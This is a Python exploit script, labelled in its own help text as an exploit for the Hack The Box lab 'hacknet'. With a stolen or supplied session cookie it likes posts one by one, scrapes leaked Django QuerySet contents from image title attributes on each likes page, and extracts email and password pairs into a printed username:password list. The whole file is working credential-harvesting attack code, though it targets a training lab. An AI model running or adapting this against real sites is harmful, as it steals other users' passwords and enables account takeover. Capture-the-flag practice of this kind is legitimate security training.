import re
import requests
import html
import sys
import argparse
from requests.exceptions import RequestException

# --- Pre-compiled Regular Expressions --- #
RE_IMG_TITLE = re.compile(r'<img [^>]*title="([^"]*)"')
RE_EMAIL = re.compile(r"'email': '([^']*)'")
RE_PASSWORD = re.compile(r"'password': '([^']*)'")


def like_post(session: requests.Session, post_id: int, base_url: str) -> bool:
    """Attempts to 'like' a post."""
    try:
        response = session.get(f"{base_url}/like/{post_id}")
        response.raise_for_status() 
        return True
    except RequestException as e:
        print(f"⚠️ [Error] Could not 'like' post {post_id}: {e}", file=sys.stderr)
        return False


def get_last_title(session: requests.Session, post_id: int, base_url: str) -> str | None:
    """Fetches the 'likes' page and extracts the last <img> title."""
    try:
        response = session.get(f"{base_url}/likes/{post_id}")
        response.raise_for_status()

        img_titles = RE_IMG_TITLE.findall(response.text)
        if not img_titles:
            return None
        
        # Unescape HTML entities from the title #
        return html.unescape(img_titles[-1])
        
    except RequestException as e:
        print(f"⚠️ [Error] Could not get 'likes' for post {post_id}: {e}", file=sys.stderr)
        return None


def parse_credentials(title_text: str) -> list[str]:
    """Parses the title text to extract 'username:password' credentials."""
    emails = RE_EMAIL.findall(title_text)
    passwords = RE_PASSWORD.findall(title_text)
    
    credentials = []
    for email, password in zip(emails, passwords):
        username = email.split('@')[0]
        credentials.append(f"{username}:{password}")
        
    return credentials


def main(base_url: str, cookie: str, max_posts: int):
    """Main script function."""
    all_users = set()
    headers = {'Cookie': cookie}

    with requests.Session() as session:
        session.headers.update(headers)

        print()
        for i in range(1, max_posts + 1):
            print(f"🔵 Processing post ID: {i}...")

            like_post(session, i, base_url)
            
            last_title = get_last_title(session, i, base_url)

            # Retry logic if the queryset information is not found #
            if not last_title or "<QuerySet" not in last_title:
                print(f"🟡 Retrying 'like' for post {i} (QuerySet not found)")
                like_post(session, i, base_url)
                last_title = get_last_title(session, i, base_url)

            # Skip if still no valid title #
            if not last_title or "<QuerySet" not in last_title:
                print(f"🔴 Could not get information from post {i}. Skipping.\n")
                continue

            credentials = parse_credentials(last_title)
            if credentials:
                print(f"🟢 Credentials found in post {i}!\n")
                all_users.update(credentials)

    print("\n--- Credentials Found ---\n")
    if not all_users:
        print("No credentials found.")
    else:
        # Print all unique credentials sorted #
        for user_pass in sorted(list(all_users)):
            print(user_pass)


if __name__ == "__main__":
    # --- CLI Argument Definitions --- #
    parser = argparse.ArgumentParser(
        description="Exploit script for 'hacknet' HTB.",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Argument for the URL #
    parser.add_argument(
        "-u", "--url",
        help="Base URL for the lab (e.g., http://hacknet.htb)",
        required=True,
        metavar="URL"
    )
    
    # Argument for the Cookie #
    parser.add_argument(
        "-c", "--cookie",
        help="Full session cookie (e.g., \"csrftoken=...; sessionid=...\")",
        required=True,
        metavar="COOKIE"
    )
    
    # Argument for the number of Posts #
    parser.add_argument(
        "-p", "--posts",
        help="Maximum number of posts to scan (default: 30)",
        type=int,
        default=30,
        metavar="NUM"
    )
    
    args = parser.parse_args()
    
    # --- Execution --- #
    try:
        main(args.url, args.cookie, args.posts)
    except KeyboardInterrupt:
        print("\n\n🛑 Execution canceled by the user.")
        sys.exit(0)